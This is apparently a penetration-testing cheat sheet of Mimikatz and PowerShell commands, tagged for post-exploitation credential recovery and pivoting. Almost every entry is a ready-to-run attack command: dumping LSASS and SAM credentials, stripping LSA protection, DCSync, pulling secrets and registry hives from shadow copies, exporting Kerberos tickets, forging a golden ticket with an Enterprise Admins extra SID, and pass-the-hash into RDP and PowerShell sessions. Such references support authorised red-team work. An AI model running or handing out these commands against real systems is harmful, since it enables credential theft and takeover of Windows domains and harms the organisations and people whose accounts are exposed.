# mimikatz

% mimikatz, passwords

## Mimikatz - Online Credential Extraction
Extracts credentials from memory (LSASS) and SAM database.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

## PowerShell - Load Mimikatz (from local file)
```powershell
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```

## Mimikatz - Disable LSA Protection (PPL) and Dump Passwords
This command attempts to disable LSA Protection (PPL) and then dump credentials from LSASS.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "privilege::debug" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
```

## Mimikatz - DCSync (Domain Controller Synchronization)
Performs a DCSync attack to extract password hashes for a specified user.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
```

## Mimikatz - Extract Credentials from LSASS Dump
Extracts credentials from a previously captured LSASS process dump.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "sekurlsa::minidump <path_to_lsass.dmp>" "sekurlsa::logonPasswords" "exit"
```

## Mimikatz - Extract Credentials from Shadow Copy (SAM/SYSTEM/SECURITY)
Extracts SAM, SYSTEM, and SECURITY hives from a shadow copy for offline credential extraction.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" "exit"
```

## Mimikatz - Extract LSA Secrets from Shadow Copy
Extracts LSA secrets from a shadow copy.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "exit"
```


## Extract SAM, SECURITY, and SYSTEM hives from Shadow Copy
Copies the SAM, SECURITY, and SYSTEM registry hives from a shadow copy to the desktop.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.hiv');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.hiv');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.hiv')"
```

% mimikatz, ad

## Mimikatz - Extract Kerberos Tickets
Extracts Kerberos tickets from memory.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
sekurlsa::tickets /export
```

## Mimikatz - Golden Ticket (Forest Extra SID)
Creates a golden ticket with an extra SID for forest trust exploitation.
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

sid : origin domain sid : Get-DomainSID -Domain domainname
sids :  ExtraSid value (Enterprise Admins SID) : parent SID
	
```powershell
kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
```

% mimikatz, pth
## Mimikatz - Pass-the-Hash (PtH) to RDP
Uses Pass-the-Hash to authenticate to a remote desktop session.
#plateform/windows  #target/local  #cat/PIVOT 
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```

## Mimikatz - Pass-the-Hash (PtH) to run PowerShell remotely
Uses Pass-the-Hash to launch a remote PowerShell session.
#plateform/windows  #target/local  #cat/PIVOT 
Followed by : Enter-PSSession -Computer {<}computer_name}
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
```